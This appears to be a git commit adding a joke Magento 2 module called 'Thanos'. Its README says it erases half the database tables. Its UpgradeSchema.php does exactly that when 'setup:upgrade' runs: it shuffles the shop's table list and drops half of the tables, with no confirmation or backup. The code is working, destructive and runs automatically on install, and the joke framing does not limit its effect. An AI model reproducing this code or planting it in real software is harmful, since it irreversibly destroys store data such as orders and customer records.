3fe4d3ddecebbccd2a18ecab8382684064336e15
Ronan Guérin <guerin.ronan@proton.me>
2024-05-03 20:44:28 +0200

    First commit

---
+++ README.md
@@ -0,0 +1,11 @@
+# Module Thanos for Magento 2
+
+With a snap of my fingers, I randomly select and eliminate half of the tables from existence.
+
+With each execution of this script, I reshape the database, imposing my will upon it. I am inevitable.
+
+### Installation
+
+Run `bin/magento setup:upgrade`
+
+That's all folks!
---
+++ Setup/UpgradeSchema.php
@@ -0,0 +1,78 @@
+<?php
+
+namespace Ronangr1\Thanos\Setup;
+
+use Magento\Framework\App\ResourceConnection;
+use Magento\Framework\Setup\ModuleContextInterface;
+use Magento\Framework\Setup\SchemaSetupInterface;
+use Magento\Framework\Setup\UpgradeSchemaInterface;
+
+class UpgradeSchema implements UpgradeSchemaInterface
+{
+
+    /**
+     * @var \Magento\Framework\App\ResourceConnection
+     */
+    private ResourceConnection $resource;
+
+    public function __construct(
+        ResourceConnection $resource
+    )
+    {
+        $this->resource = $resource;
+    }
+
+    /**
+     * @param \Magento\Framework\Setup\SchemaSetupInterface $setup
+     * @param \Magento\Framework\Setup\ModuleContextInterface $context
+     * @return void
+     * @throws \Zend_Db_Statement_Exception
+     */
+    public function upgrade(SchemaSetupInterface $setup, ModuleContextInterface $context)
+    {
+        $setup->startSetup();
+
+        $halfTables = $this->getHalfTables();
+        $this->dropTables($setup, $halfTables);
+
+        $setup->endSetup();
+    }
+
+    /**
+     * @throws \Zend_Db_Statement_Exception
+     * @return array
+     */
+    private function getHalfTables()
+    {
+        $connection = $this->resource->getConnection();
+        $dbName = $this->resource->getTableName('');
+
+        $tables = $connection->query("SHOW TABLES LIKE '{$dbName}%'")->fetchAll();
+
+        $tableNames = [];
+        foreach ($tables as $table) {
+            $tableNames[] = current($table);
+        }
+
+        shuffle($tableNames);
+
+        return array_slice($tableNames, 0, count($tableNames) / 2);
+    }
+
+    /**
+     * @param \Magento\Framework\Setup\SchemaSetupInterface $setup
+     * @param array $tables
+     * @return void
+     */
+    private function dropTables(SchemaSetupInterface $setup, array $tables)
+    {
+        $connection = $setup->getConnection();
+
+        foreach ($tables as $table) {
+            $tableName = $setup->getTable($table);
+            if ($connection->isTableExists($tableName)) {
+                $connection->dropTable($tableName);
+            }
+        }
+    }
+}
